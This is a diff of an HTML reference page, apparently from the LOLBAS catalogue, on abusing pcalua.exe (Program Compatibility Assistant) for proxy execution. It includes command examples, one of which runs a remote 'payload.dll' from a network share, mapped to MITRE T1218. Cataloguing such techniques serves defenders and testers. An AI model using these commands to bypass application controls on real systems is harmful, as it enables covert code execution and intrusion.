@@ -28,15 +28,19 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Pcalua/#execute">Execute</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Pcalua/#execute">Execute</a></li>
+	
 </ul>
 
+	
+
 <p>Program Compatibility Assistant</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -48,90 +52,83 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/KyleHanslovan/status/912659279806640128">https://twitter.com/KyleHanslovan/status/912659279806640128</a></li>
+	<a href="https://twitter.com/KyleHanslovan/status/912659279806640128">https://twitter.com/KyleHanslovan/status/912659279806640128</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Kyle Hanslovan - <a href="https://twitter.com/@kylehanslovan">@kylehanslovan</a </li>
+	Kyle Hanslovan - <a href="https://twitter.com/@kylehanslovan">@kylehanslovan</a>
+	<br>
 	
-	<li>Fab - <a href="https://twitter.com/@0rbz_">@0rbz_</a </li>
+	Fab - <a href="https://twitter.com/@0rbz_">@0rbz_</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Open the target .EXE using the Program Compatibility Assistant.</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Open the target .EXE using the Program Compatibility Assistant.
+		<br>
+		<pre><code>pcalua.exe -a calc.exe</code></pre>
 		Usecase:Proxy execution of binary
-        <pre><code>pcalua.exe -a calc.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Open the target .DLL file with the Program Compatibilty Assistant.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Open the target .DLL file with the Program Compatibilty Assistant.
+		<br>
+		<pre><code>pcalua.exe -a \\server\payload.dll</code></pre>
 		Usecase:Proxy execution of remote dll file
-        <pre><code>pcalua.exe -a \\server\payload.dll</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Open the target .CPL file with the Program Compatibility Assistant.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Open the target .CPL file with the Program Compatibility Assistant.
+		<br>
+		<pre><code>pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java</code></pre>
 		Usecase:Execution of CPL files
-        <pre><code>pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
